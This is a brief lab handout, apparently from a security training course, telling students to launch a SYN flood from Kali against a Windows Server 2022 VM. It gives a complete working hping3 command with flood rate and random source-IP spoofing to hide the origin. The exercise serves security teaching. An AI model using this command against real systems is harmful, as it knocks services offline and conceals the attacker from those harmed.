# Lab 7: Launching a DoS Attack

#### Overview
- In this exercise, you’ll perform a SYN flood attack using the hping3 utility. Windows Server 2022 and Kali should both be open.

#### hping3
- Hping is a packet crafting tool which allows you to send arbitrary network data, including DoS floods.
- `sudo hping3 10.10.10.2  -d 120 -S --flood --rand-source -p 80`
    - This command will target port 80 of the Windows Server 2022 VM with a high speed SYN flood attack. Each packet is 120 bytes, and it spoofs a random source IP address for each packet to hide the attack’s origin.

